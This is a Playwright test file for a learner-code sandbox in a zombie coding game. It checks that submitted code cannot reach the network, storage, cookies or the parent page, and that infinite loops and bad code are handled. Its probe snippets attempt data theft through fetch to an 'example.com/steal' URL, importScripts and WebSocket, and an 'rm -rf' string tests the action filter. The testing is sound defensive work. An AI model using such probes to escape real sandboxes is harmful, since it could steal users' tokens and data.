import { test } from "node:test";
import assert from "node:assert/strict";
import { chromium } from "playwright";
import { startServer } from "./static-server.mjs";
import { parseResult, workerProgram } from "../js/game/zombie/sandbox.js";
import { LEVELS } from "../js/game/zombie/levels.js";

test("parseResult whitelists actions and caps their number", () => {
  const r = parseResult(["noise", "@@ZB" + JSON.stringify({ a: ["shoot N", "rm -rf", "move E", 7, "Throw w", ...Array(100).fill("wait")], e: null })]);
  assert.deepEqual(r.actions.slice(0, 5), ["shoot N", "!rm -rf", "move E", "!", "Throw w"]); assert.equal(r.actions.length, 60);
  assert.equal(parseResult(["nothing"]), null); assert.equal(parseResult(["@@ZB{bad"]), null);
});
test("the Worker program receives only the map, never the solution", () => {
  const src = workerProgram(LEVELS[0], "function act(s){return 'wait'}", "/*engine*/");
  assert.ok(!src.includes(LEVELS[0].solution.slice(10, 40))); assert.ok(!/hints|starter/.test(src.split("var __level=")[1].split(";")[0]));
});

const PROBES = {
  fetchExternal: `fetch("https://example.com/steal?x=1").then(function(){}, function(){}); fetch("/").then(function(){}, function(){}); leak.push(typeof XMLHttpRequest, typeof WebSocket);`,
  storage: `leak.push(typeof localStorage, typeof document, typeof window, typeof parent, typeof top, String(self.origin));`,
  importScripts: `importScripts("https://example.com/x.js");`,
  websocket: `new WebSocket("wss://example.com/x");`,
};
test("browser: sandbox cannot reach network, storage, cookies, parent or tokens; loops and bad code are handled", async () => {
  const srv = await startServer(), base = `http://127.0.0.1:${srv.address().port}`;
  const browser = await chromium.launch(); const page = await (await browser.newContext()).newPage();
  const external = []; await page.route(/^https?:\/\/(?!127\.|localhost)/, (r) => { external.push(r.request().url()); r.abort(); });
  await page.goto(base + "/play/index.html");
  await page.evaluate(() => { localStorage.setItem("fayad-supabase-auth", JSON.stringify({ access_token: "SECRET-TOKEN-123" })); document.cookie = "sb=SECRET-COOKIE"; });
  const go = (code) => Promise.race([page.evaluate(async (code) => { const { runLearner } = await import("/js/game/zombie/sandbox.js"); const { LEVELS } = await import("/js/game/zombie/levels.js"); const o = await runLearner(LEVELS[0], code === "@good" ? LEVELS[0].solution : code); return { error: o.error, timeout: o.timeout, ok: !!(o.res && o.res.ok) }; }, code), new Promise((r) => setTimeout(() => r({ hang: true }), 12000))]);
  external.length = 0;
  const probe = (b) => `function act(s){ var leak=[]; try{ ${b} }catch(e){ leak.push("blocked:"+(e&&e.name)); } throw new Error("PROBE "+leak.join("|")); }`;
  const r = {}; for (const [k, b] of Object.entries(PROBES)) r[k] = await go(probe(b));
  r.loop = await go("function act(s){ while(true){} }"); r.bad = await go("function act(s){ return 42 }"); r.syntax = await go("function act(s){ return "); r.good = await go("@good");
  await browser.close(); srv.close();
  for (const [k, v] of Object.entries(r)) assert.ok(!v.hang, k + " hung");
  assert.deepEqual(external.filter((u) => !/supabase-js/.test(u)), [], "network leaked");
  assert.ok(!/SECRET/.test(JSON.stringify(r)));
  assert.match(r.storage.error, /PROBE undefined\|undefined\|undefined\|undefined\|undefined\|null/);
  assert.match(r.importScripts.error, /blocked/); assert.match(r.websocket.error, /blocked|PROBE/);
  assert.equal(r.loop.timeout, true); assert.match(r.bad.error, /must return a string/); assert.match(r.syntax.error, /Syntax/i); assert.equal(r.good.ok, true);
});

test("browser: all 15 reference solutions win when executed inside the sandbox, with the same outcome as the node engine", async () => {
  const { analyze } = await import("../tools/zombie/analyze.mjs");
  const srv = await startServer(), base = `http://127.0.0.1:${srv.address().port}`; const browser = await chromium.launch(); const page = await (await browser.newContext()).newPage();
  await page.route(/^https?:\/\/(?!127\.|localhost)/, (r) => r.abort()); await page.goto(base + "/play/index.html");
  const got = await page.evaluate(async () => { const { runLearner } = await import("/js/game/zombie/sandbox.js"); const { LEVELS } = await import("/js/game/zombie/levels.js"); const out = []; for (const l of LEVELS) { const o = await runLearner(l, l.solution); out.push({ id: l.id, ok: !!(o.res && o.res.ok), turns: o.res && o.res.turns, hp: o.res && o.res.hp, bonus: o.res && o.res.bonus, error: o.error }); } return out; });
  await browser.close(); srv.close();
  analyze().forEach((a, i) => { assert.equal(got[i].ok, true, "level " + a.id + " " + got[i].error); assert.equal(got[i].turns, a.ref.turns); assert.equal(got[i].hp, a.ref.hp); assert.equal(!!got[i].bonus, !!a.ref.bonus); });
});
